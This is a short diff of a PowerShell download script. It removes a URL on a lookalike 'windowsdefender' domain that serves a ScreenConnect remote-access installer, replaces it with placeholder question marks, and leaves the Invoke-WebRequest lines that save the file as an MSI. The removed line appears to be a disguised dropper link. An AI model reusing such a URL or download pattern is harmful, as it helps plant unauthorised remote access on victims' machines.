@@ -1,4 +1,4 @@
-$url = "https://windowsdefender.fudisa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=TEST&c=&c=&c=&c=&c=&c=&c="
+$url = "?????"
 $msi = "C:\Temp\ScreenConnect.msi"
 mkdir C:\Temp -Force | Out-Null
 Invoke-WebRequest -Uri $url -OutFile $msi -UseBasicParsing
